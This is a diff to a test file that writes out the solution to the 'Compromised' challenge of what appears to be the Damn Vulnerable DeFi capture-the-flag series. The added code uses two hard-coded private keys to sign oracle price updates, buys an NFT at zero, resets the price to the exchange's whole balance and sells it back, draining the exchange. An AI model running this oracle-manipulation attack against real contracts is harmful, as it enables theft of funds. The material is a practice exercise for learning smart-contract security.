@@ -62,15 +62,24 @@ describe('Compromised challenge', function () {
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
         let privateKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
-        let source1 = new ethers.Wallet(privateKey1);
+        let source1 = new ethers.Wallet(privateKey1, ethers.provider);
 
         let privateKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
-        let source2 = new ethers.Wallet(privateKey2);
+        let source2 = new ethers.Wallet(privateKey2, ethers.provider);
 
-        this.oracle.connect(source1).postPrice("DVNFT", '0');
-        this.oracle.connect(source2).postPrice("DVNFT", '0');
+        await this.oracle.connect(source1).postPrice("DVNFT", 0);
+        await this.oracle.connect(source2).postPrice("DVNFT", 0);
 
-        this.exchange.connect(attacker).buyOne({ value: '1' })
+        let id = await this.exchange.connect(attacker).callStatic.buyOne({ value: 1 });
+        await this.exchange.connect(attacker).buyOne({ value: 1 });
+        console.log(id)
+
+        await this.oracle.connect(source1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(source2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, id) 
+        await this.exchange.connect(attacker).sellOne(id);
+
     });
 
     after(async function () {
